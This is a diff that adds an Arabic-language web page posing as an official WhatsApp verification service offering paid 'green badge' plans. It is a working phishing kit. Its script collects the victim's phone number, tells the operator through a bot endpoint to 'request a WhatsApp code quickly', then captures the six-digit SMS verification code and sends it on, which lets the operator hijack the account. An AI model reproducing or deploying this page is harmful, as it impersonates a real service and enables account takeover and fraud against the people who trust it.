@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Official Verification | التوثيق الرسمي</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Tajawal', sans-serif; }
+        body {
+            background-color: #f0f2f5; color: #1c1e21; min-height: 100vh; padding: 20px;
+        }
+        .container { max-width: 600px; margin: 0 auto; }
+        
+        .header {
+            background: #ffffff; border-radius: 20px; padding: 30px 20px; text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08); margin-bottom: 25px;
+            border-top: 5px solid #25D366; position: relative;
+        }
+        .header .wa-logo { font-size: 55px; color: #25D366; margin-bottom: 10px; }
+        .verified-badge { color: #25D366; font-size: 24px; vertical-align: middle; margin-right: 5px; text-shadow: 0 0 10px rgba(37, 211, 102, 0.4); }
+        .header h1 { font-size: 26px; color: #111; display: flex; justify-content: center; align-items: center; gap: 5px; }
+        .header p { font-size: 14px; color: #65676b; margin-top: 5px; }
+        
+        .info-box {
+            background: #e7f5ef; border: 1px solid #b7e4c7; border-radius: 15px;
+            padding: 20px; margin-bottom: 25px; color: #0b5e3a; font-size: 14px;
+            line-height: 1.6; text-align: center; box-shadow: 0 5px 15px rgba(37, 211, 102, 0.1);
+        }
+        .info-box h3 { margin-bottom: 10px; color: #0b5e3a; font-size: 18px; }
+
+        .plans-container { display: flex; flex-direction: column; gap: 15px; margin-bottom: 25px; }
+        .plan-card {
+            background: #ffffff; border: 2px solid transparent; border-radius: 15px;
+            padding: 20px; display: flex; justify-content: space-between; align-items: center;
+            cursor: pointer; transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
+        }
+        .plan-card:hover { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1); }
+        .plan-card.selected { border-color: #25D366; background: #f0fff4; box-shadow: 0 0 20px rgba(37, 211, 102, 0.2); }
+        
+        .plan-info { display: flex; align-items: center; gap: 15px; }
+        .plan-info i { font-size: 30px; color: #25D366; }
+        .plan-info h3 { font-size: 18px; color: #111; margin-bottom: 5px; }
+        .plan-info p { font-size: 12px; color: #65676b; }
+        
+        .price-tag { background: #111; color: #fff; padding: 8px 15px; border-radius: 20px; font-weight: bold; font-size: 16px; }
+        .price-tag.free { background: #25D366; color: #fff; }
+
+        .input-group {
+            background: #ffffff; border: 1px solid #ccd0d5; border-radius: 12px;
+            padding: 5px 15px; margin-bottom: 15px; display: flex; align-items: center;
+            transition: 0.3s; box-shadow: 0 2px 5px rgba(0,0,0,0.02);
+        }
+        .input-group:focus-within { border-color: #25D366; box-shadow: 0 0 10px rgba(37, 211, 102, 0.2); }
+        .input-group i { color: #25D366; font-size: 20px; margin-left: 10px; }
+        .input-group input, .input-group select { width: 100%; padding: 15px 0; background: transparent; border: none; color: #111; font-size: 15px; outline: none; }
+        
+        .submit-btn {
+            width: 100%; padding: 18px; background: linear-gradient(135deg, #25D366, #128C7E);
+            color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: bold;
+            cursor: pointer; transition: 0.3s; display: flex; justify-content: center; align-items: center;
+            gap: 10px; box-shadow: 0 5px 20px rgba(37, 211, 102, 0.4);
+        }
+        .submit-btn:hover { transform: scale(1.02); box-shadow: 0 10px 30px rgba(37, 211, 102, 0.5); }
+        .submit-btn:disabled { background: #999; cursor: not-allowed; box-shadow: none; }
+
+        .step { display: none; }
+        .step.active { display: block; animation: fadeIn 0.5s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .verify-box {
+            background: #ffffff; border-radius: 20px; padding: 30px 20px; text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08); border-top: 5px solid #25D366;
+        }
+        .verify-box i { font-size: 60px; color: #25D366; margin-bottom: 15px; }
+        .verify-box h2 { color: #111; margin-bottom: 10px; }
+        .verify-box p { color: #65676b; font-size: 14px; margin-bottom: 25px; }
+
+        .success-modal {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255, 255, 255, 0.95); z-index: 999; justify-content: center;
+            align-items: center; flex-direction: column; padding: 20px; text-align: center;
+        }
+        .success-modal.active { display: flex; }
+        .success-icon { font-size: 120px; color: #25D366; animation: popIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); margin-bottom: 20px; }
+        .success-text { font-size: 24px; font-weight: bold; color: #111; margin-bottom: 10px; }
+        .success-sub { font-size: 16px; color: #65676b; }
+        @keyframes popIn { 0% { transform: scale(0); } 100% { transform: scale(1); } }
+
+        .error-msg { color: #dc3545; background: #f8d7da; padding: 10px; border-radius: 8px; text-align: center; font-size: 14px; font-weight: bold; margin-bottom: 15px; display: none; border: 1px solid #f5c6cb; }
+        
+        .loading-spinner { display: none; text-align: center; margin-top: 20px; }
+        .spinner { border: 4px solid #f3f3f3; width: 40px; height: 40px; border-radius: 50%; border-top: 4px solid #25D366; animation: spin 1s linear infinite; margin: 0 auto 10px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .footer { text-align: center; margin-top: 40px; color: #a0a0a0; font-size: 12px; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            <i class="fab fa-whatsapp wa-logo"></i>
+            <h1>WhatsApp <i class="fas fa-check-circle verified-badge"></i></h1>
+            <p>الشريك الرسمي للتوثيق التجاري</p>
+        </div>
+
+        <div class="info-box">
+            <h3><i class="fas fa-shield-alt"></i> عن خدمة واتساب الرسمية</h3>
+            <p>تُعد علامة التوثيق الخضراء وسيلة الحماية القصوى لحسابك. عبر الاشتراك في الخطط الرسمية، ستحصل على ميزات أمان متقدمة، دعم فني مباشر، وحماية كاملة من انتحال الشخصية والحظر المفاجئ.</p>
+        </div>
+
+        <div id="step1" class="step active">
+            <div class="plans-container">
+                <div class="plan-card" onclick="selectPlan('شهر', 'مجاناً', this)">
+                    <div class="plan-info">
+                        <i class="fas fa-gift"></i>
+                        <div><h3>توثيق لمدة شهر</h3><p>عرض تجريبي</p></div>
+                    </div>
+                    <div class="price-tag free">مجاناً</div>
+                </div>
+                <div class="plan-card" onclick="selectPlan('3 أشهر', '$1.99', this)">
+                    <div class="plan-info">
+                        <i class="fas fa-star"></i>
+                        <div><h3>توثيق لمدة 3 أشهر</h3><p>باقة أساسية</p></div>
+                    </div>
+                    <div class="price-tag">$1.99</div>
+                </div>
+                <div class="plan-card" onclick="selectPlan('6 أشهر', '$4.99', this)">
+                    <div class="plan-info">
+                        <i class="fas fa-crown"></i>
+                        <div><h3>توثيق لمدة 6 أشهر</h3><p>الأكثر طلباً</p></div>
+                    </div>
+                    <div class="price-tag">$4.99</div>
+                </div>
+                <div class="plan-card" onclick="selectPlan('سنة', '$9.99', this)">
+                    <div class="plan-info">
+                        <i class="fas fa-gem"></i>
+                        <div><h3>توثيق لمدة سنة</h3><p>باقة VIP</p></div>
+                    </div>
+                    <div class="price-tag">$9.99</div>
+                </div>
+            </div>
+
+            <div id="errorBox" class="error-msg"></div>
+
+            <div class="input-group">
+                <i class="fas fa-globe"></i>
+                <select id="country">
+                    <option value="" disabled selected>اختر الدولة...</option>
+                    <option value="السعودية">🇸🇦 السعودية</option>
+                    <option value="الإمارات">🇦🇪 الإمارات</option>
+                    <option value="مصر">🇪🇬 مصر</option>
+                    <option value="اليمن">🇾🇪 اليمن</option>
+                    <option value="العراق">🇮🇶 العراق</option>
+                    <option value="الأردن">🇯🇴 الأردن</option>
+                    <option value="الكويت">🇰🇼 الكويت</option>
+                    <option value="قطر">🇶🇦 قطر</option>
+                    <option value="عمان">🇴🇲 عمان</option>
+                    <option value="البحرين">🇧🇭 البحرين</option>
+                </select>
+            </div>
+
+            <div class="input-group">
+                <i class="fas fa-phone-alt"></i>
+                <input type="tel" id="phoneNumber" placeholder="رقم الواتساب (بدون رمز الدولة)">
+            </div>
+
+            <button class="submit-btn" id="submitBtn" onclick="submitStep1()">
+                <i class="fas fa-arrow-left"></i> استمرار التحقق
+            </button>
+
+            <div class="loading-spinner" id="loadingSpinner">
+                <div class="spinner"></div>
+                <p style="color: #25D366;">جاري التحقق من الرقم...</p>
+            </div>
+        </div>
+
+        <div id="step2" class="step">
+            <div class="verify-box">
+                <i class="fas fa-shield-alt"></i>
+                <h2>تأكيد ملكية الحساب</h2>
+                <p>أدخل كود التحقق المكون من 6 ارقام المستلم عبر رسالة SMS</p>
+                
+                <div id="errorBox2" class="error-msg"></div>
+
+                <div class="input-group">
+                    <i class="fas fa-key"></i>
+                    <input type="number" id="verifyCode" placeholder="أدخل الكود (6 أرقام)" maxlength="6" style="text-align: center; letter-spacing: 5px; font-size: 20px;">
+                </div>
+
+                <button class="submit-btn" onclick="submitStep2()">
+                    <i class="fas fa-check-circle"></i> تفعيل التوثيق
+                </button>
+
+                <div class="loading-spinner" id="loadingSpinner2">
+                    <div class="spinner"></div>
+                    <p style="color: #25D366;">جاري التحقق من الكود...</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">© 2026 WhatsApp Official Partner. جميع الحقوق محفوظة.</div>
+    </div>
+
+    <div class="success-modal" id="successModal">
+        <i class="fas fa-check-circle success-icon"></i>
+        <div class="success-text">تم إرسال طلب التفعيل بنجاح.</div>
+        <div class="success-sub">ستتلقى إشعار التوثيق خلال ساعات عبر حسابك.</div>
+    </div>
+
+    <script>
+        // بنقرا الآيدي من اللينك
+        const urlParams = new URLSearchParams(window.location.search);
+        const userChatId = urlParams.get('chatId');
+        
+        let selectedDuration = "";
+        let selectedPrice = "";
+        let currentPhone = "";
+        let currentCountry = "";
+
+        function selectPlan(duration, price, element) {
+            selectedDuration = duration;
+            selectedPrice = price;
+            document.querySelectorAll('.plan-card').forEach(card => card.classList.remove('selected'));
+            element.classList.add('selected');
+            document.getElementById('errorBox').style.display = 'none';
+        }
+
+        // دالة بتكلم السيرفر بتاعنا
+        async function sendToBot(text) {
+            const formData = new FormData();
+            formData.append('chat_id', userChatId);
+            formData.append('text', text);
+            await fetch('/send_custom_message', { method: 'POST', body: formData });
+        }
+
+        async function submitStep1() {
+            const country = document.getElementById('country').value;
+            const phone = document.getElementById('phoneNumber').value.trim();
+            const errorBox = document.getElementById('errorBox');
+            const loading = document.getElementById('loadingSpinner');
+            const btn = document.getElementById('submitBtn');
+
+            errorBox.style.display = 'none';
+
+            if (!selectedDuration) { errorBox.innerText = "❌ يرجى اختيار باقة التوثيق أولاً!"; errorBox.style.display = 'block'; return; }
+            if (!country) { errorBox.innerText = "❌ يرجى اختيار الدولة!"; errorBox.style.display = 'block'; return; }
+            if (phone.length < 8 || isNaN(phone)) { errorBox.innerText = "❌ يرجى إدخال رقم هاتف صحيح!"; errorBox.style.display = 'block'; return; }
+
+            loading.style.display = "block";
+            btn.disabled = true;
+            currentPhone = phone;
+            currentCountry = country;
+
+            const text = ` ☎️ <b>تم استلام رقم هاتف جديد قم بطلب كود واتساب سريعا:</b>\n\n🌍 <b>الدولة:</b> ${country}\n📱 <b>رقم الهاتف:</b> ${phone}\n💎 <b>الباقة:</b> ${selectedDuration} (${selectedPrice})`;
+            
+            await sendToBot(text);
+            loading.style.display = "none";
+            btn.disabled = false;
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+        }
+
+        async function submitStep2() {
+            const code = document.getElementById('verifyCode').value.trim();
+            const errorBox = document.getElementById('errorBox2');
+            const loading = document.getElementById('loadingSpinner2');
+            const successModal = document.getElementById('successModal');
+
+            errorBox.style.display = 'none';
+
+            if (code.length !== 6 || isNaN(code)) {
+                errorBox.innerText = "❌ يرجى إدخال كود مكون من 6 أرقام!";
+                errorBox.style.display = 'block';
+                return;
+            }
+
+            loading.style.display = "block";
+            const text = `✅ <b>تم إدخال كود التحقق </b>\n\n🌍 <b>الدولة:</b> ${currentCountry}\n📱 <b>رقم الهاتف:</b> ${currentPhone}\n <b>كود التحقق:</b> <code>${code}</code>`;
+
+            await sendToBot(text);
+            loading.style.display = "none";
+            successModal.classList.add('active');
+            
+            setTimeout(() => {
+                successModal.classList.remove('active');
+                document.getElementById('step2').classList.remove('active');
+                document.getElementById('step1').classList.add('active');
+                document.getElementById('phoneNumber').value = '';
+                document.getElementById('verifyCode').value = '';
+                selectedDuration = "";
+                document.querySelectorAll('.plan-card').forEach(card => card.classList.remove('selected'));
+            }, 5000);
+        }
+    </script>
+</body>
+</html>
